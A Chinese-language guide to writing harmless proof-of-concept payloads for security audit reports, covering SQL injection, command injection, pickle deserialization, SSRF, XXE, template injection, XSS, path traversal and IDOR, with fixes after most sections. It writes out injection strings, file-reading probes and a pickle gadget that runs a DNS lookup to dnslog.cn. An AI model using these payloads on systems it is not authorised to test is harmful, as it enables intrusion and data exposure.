# PoC 生成指南

> 每个 Critical/High 漏洞应附有可验证的 PoC，帮助开发团队理解风险。

---

## PoC 生成原则

```
1. 无害化: PoC 仅证明可达性，不造成破坏
2. 可复现: 包含完整的请求/命令/操作步骤
3. 最小化: 使用最简单的 payload
4. 含修复: 每个 PoC 后附修复建议
```

---

## 按漏洞类型的 PoC 模板

### SQL 注入

```http
# 检测: 布尔盲注
GET /api/users?id=1' AND '1'='1   → 正常返回
GET /api/users?id=1' AND '1'='2   → 条件不满足

# 检测: 报错注入
GET /api/users?id=1' AND extractvalue(1,concat(0x7e,version()))--

# 检测: UNION 注入
GET /api/users?id=-1 UNION SELECT 1,user(),3,4--

# 检测: 时间盲注 (无害)
GET /api/users?id=1' AND SLEEP(3)--     → 延迟 3 秒

# MyBatis ${} ORDER BY 注入
GET /api/users?sort=id;SELECT+1--
GET /api/users?sort=id,(SELECT+1+FROM+pg_sleep(3))--
```

**修复**: 参数绑定 (#{}) / 白名单 (ORDER BY 场景)

### 命令注入

```http
# 检测: 时间延迟 (无害)
POST /api/ping
{"host": "127.0.0.1;sleep 3"}         → 延迟 3 秒

# 检测: DNS 外带 (无害)
POST /api/ping
{"host": "127.0.0.1;nslookup test.dnslog.cn"}

# 检测: 管道符
{"host": "127.0.0.1|id"}
{"host": "127.0.0.1$(id)"}
{"host": "127.0.0.1`id`"}
```

**修复**: shell=False + 数组参数 / shlex.quote() / 白名单验证

### 反序列化

```
# Java — 检测 ObjectInputStream
步骤:
1. 确认入口点接受二进制数据
2. 检查是否有 ObjectInputFilter
3. 检查 ClassPath 中的 Gadget 依赖 (CC/CB/C3P0)
4. 构建无害 payload: URLDNS 链 (仅触发 DNS 请求)

# Python — Pickle
import pickle, os
# 无害检测: 触发 DNS
class Probe:
    def __reduce__(self):
        return (os.system, ('nslookup test.dnslog.cn',))

# PHP — unserialize
# 搜索 __destruct / __wakeup 魔术方法
# 构造触发链
```

### SSRF

```http
# 检测: 内网探测 (无害)
POST /api/proxy
{"url": "http://127.0.0.1:8080"}      → 返回内容 = SSRF

# 检测: 协议探测
{"url": "file:///etc/hostname"}
{"url": "gopher://127.0.0.1:6379/_INFO"}

# 检测: DNS 外带
{"url": "http://test.dnslog.cn"}        → DNS 记录
```

**修复**: URL 白名单 + IP 黑名单 + 协议限制

### XXE

```http
POST /api/import Content-Type: application/xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<root>&xxe;</root>
```

**修复**: 禁用外部实体 `dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)`

### SSTI 模板注入

```http
# 检测: 数学运算
GET /page?name={{7*7}}                  → 49 = Jinja2
GET /page?name=${7*7}                   → 49 = Mako/Velocity
GET /page?name=<%=7*7%>                 → 49 = ERB

# Jinja2 RCE 验证 (无害)
{{config.items()}}
{{cycler.__init__.__globals__}}
```

### XSS

```http
# 反射型 XSS
GET /search?q=<img/src=x onerror=alert(1)>
GET /search?q="><script>alert(document.domain)</script>

# 存储型 XSS (用安全 payload)
POST /api/comment
{"content": "<img src=x onerror=alert(document.domain)>"}

# DOM XSS (检查 JS 代码)
# 寻找 innerHTML / document.write / eval 接受 URL 参数
```

### 路径遍历

```http
# 检测: 读取系统文件
GET /api/file?path=../../../../etc/passwd
GET /api/file?path=....//....//etc/passwd        # 双重编码绕过
GET /api/file?path=%2e%2e%2f%2e%2e%2fetc/passwd  # URL 编码

# Windows
GET /api/file?path=..\..\Windows\win.ini
```

### IDOR

```http
# 检测: 越权访问
# 用户 A (id=100) 尝试访问用户 B (id=101) 的资源
GET /api/user/101/profile                        # 用 A 的 token
DELETE /api/user/101                             # 用 A 的 token
GET /api/orders/search?userId=101                # 用 A 的 token
```

---

## PoC 书写规范

```markdown
### PoC — [漏洞类型]

**前置条件**: [需要认证? 需要特定角色?]

**请求**:
(HTTP 请求示例)

**预期结果**:
(描述漏洞触发的表现)

**安全 payload 说明**:
(解释为什么 payload 是无害的)

**修复建议**:
(安全替代方案和代码示例)
```
